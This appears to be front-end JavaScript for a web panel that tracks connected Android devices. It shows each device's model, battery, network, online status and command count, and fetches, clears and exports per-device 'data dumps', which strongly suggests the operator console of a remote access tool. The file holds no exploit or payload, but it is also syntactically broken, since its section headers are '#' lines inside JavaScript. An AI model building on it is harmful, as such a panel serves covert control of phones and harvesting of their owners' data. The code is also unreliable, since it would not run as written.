// ============================================
# 📊 DASHBOARD FUNCTIONS
// ============================================

let totalDumps = 0;

// ============================================
# 🚪 LOGOUT
// ============================================

function logout() {
    if (confirm('Are you sure you want to logout?')) {
        window.location.href = '/';
    }
}

// ============================================
# 🔄 REFRESH FUNCTIONS
// ============================================

function refreshDevices() {
    fetch('/api/devices')
        .then(res => res.json())
        .then(data => {
            devices = data;
            updateDeviceList();
            updateStats();
            showNotification('✅ Devices refreshed', 'success');
        })
        .catch(err => {
            console.error('Refresh failed:', err);
            showNotification('❌ Refresh failed', 'error');
        });
}

function refreshDumps() {
    if (!selectedDeviceId) {
        showNotification('⚠️ Select a device first', 'warning');
        return;
    }
    loadDumps(selectedDeviceId);
    showNotification('✅ Dumps refreshed', 'success');
}

// ============================================
# 🗑️ CLEAR DUMPS
// ============================================

function clearDumps() {
    if (!selectedDeviceId) {
        showNotification('⚠️ Select a device first', 'warning');
        return;
    }
    
    if (!confirm('Clear all dumps for this device?')) return;
    
    // Clear from server
    fetch(`/api/dumps/${selectedDeviceId}`, { method: 'DELETE' })
        .then(res => res.json())
        .then(() => {
            dumpCache[selectedDeviceId] = [];
            document.getElementById('dumpContent').innerHTML = 
                '<p class="empty">No data dumps for this device</p>';
            updateStats();
            showNotification('✅ Dumps cleared', 'success');
        })
        .catch(err => {
            console.error('Clear dumps error:', err);
            showNotification('❌ Failed to clear dumps', 'error');
        });
}

// ============================================
# 💾 EXPORT ALL DUMPS
// ============================================

function exportAllDumps() {
    if (!selectedDeviceId) {
        showNotification('⚠️ Select a device first', 'warning');
        return;
    }
    
    fetch(`/api/export/${selectedDeviceId}`)
        .then(res => res.json())
        .then(data => {
            if (!data.dumps || data.dumps.length === 0) {
                showNotification('⚠️ No dumps to export', 'warning');
                return;
            }
            
            const blob = new Blob([JSON.stringify(data, null, 2)], 
                { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `device_${selectedDeviceId}_${Date.now()}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showNotification('✅ Export completed', 'success');
        })
        .catch(err => {
            console.error('Export error:', err);
            showNotification('❌ Export failed', 'error');
        });
}

// ============================================
# 👁️ VIEW DEVICE DETAILS
// ============================================

function viewDeviceDetails(deviceId) {
    const device = devices[deviceId];
    if (!device) {
        showNotification('⚠️ Device not found', 'warning');
        return;
    }
    
    const info = device.info || {};
    const details = `
📱 DEVICE DETAILS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Model: ${info.model || 'Unknown'}
Brand: ${info.brand || 'Unknown'}
Android: ${info.android || 'Unknown'}
SDK: ${info.sdk || 'Unknown'}
Device ID: ${deviceId}
Network: ${info.network || 'Unknown'}
Battery: ${info.battery || 'Unknown'}
Status: ${device.connected ? '🟢 Online' : '🔴 Offline'}
First Seen: ${device.firstSeen ? new Date(device.firstSeen).toLocaleString() : 'Never'}
Last Seen: ${device.lastSeen ? new Date(device.lastSeen).toLocaleString() : 'Never'}
Commands: ${(device.commands || []).length}
Dumps: ${(dumpCache[deviceId] || []).length}
    `;
    alert(details);
}

// ============================================
# ⌨️ KEYBOARD SHORTCUTS
// ============================================

document.addEventListener('keydown', function(e) {
    // Ctrl+R = Refresh
    if (e.ctrlKey && e.key === 'r') {
        e.preventDefault();
        refreshDevices();
    }
    // Ctrl+D = Refresh dumps
    if (e.ctrlKey && e.key === 'd') {
        e.preventDefault();
        refreshDumps();
    }
    // Escape = Clear selection
    if (e.key === 'Escape') {
        selectedDeviceId = null;
        document.getElementById('selectedDevice').innerHTML = 
            '<p class="empty">Select a device first</p>';
        document.getElementById('commandButtons').style.display = 'none';
        updateDeviceList();
    }
});

// ============================================
# 📊 CONSOLE HELPERS
// ============================================

console.log('📊 Dashboard loaded!');
console.log('Commands:');
console.log('  refreshDevices()     - Refresh device list');
console.log('  refreshDumps()       - Refresh dumps');
console.log('  clearDumps()         - Clear all dumps');
console.log('  exportAllDumps()     - Export all dumps');
console.log('  viewDeviceDetails(id) - View device details');
console.log('  logout()             - Logout');
console.log('Shortcuts:');
console.log('  Ctrl+R - Refresh devices');
console.log('  Ctrl+D - Refresh dumps');
console.log('  Escape - Clear selection');

// ============================================
# 🔄 EXPOSE FUNCTIONS
// ============================================

window.refreshDevices = refreshDevices;
window.refreshDumps = refreshDumps;
window.clearDumps = clearDumps;
window.exportAllDumps = exportAllDumps;
window.viewDeviceDetails = viewDeviceDetails;
window.logout = logout;